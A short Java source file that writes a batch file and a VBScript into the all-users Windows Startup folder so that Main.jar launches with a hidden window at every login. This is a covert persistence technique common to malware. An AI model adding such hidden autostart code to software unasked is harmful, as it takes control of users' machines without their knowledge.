package dataProject;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class Self
{
  public static void main(String[] args)
  {
    String selfPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp";
    File dir = new File(selfPath);
    if (dir.exists()) {
      File bat = new File("startup.bat");
      try
      {
        if (!bat.exists()) {
          bat.createNewFile();
        }
        FileWriter writer = new FileWriter(bat);
        writer.write("java -jar Main.jar");
        writer.flush();
        writer.close();
        writer = new FileWriter(selfPath + "\\Main_startup.vbs");
        writer.write("createobject(\"wscript.shell\").run \"" + bat.getAbsolutePath() + "\",0 ");
        writer.flush();
        writer.close();

        return;
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
  }
}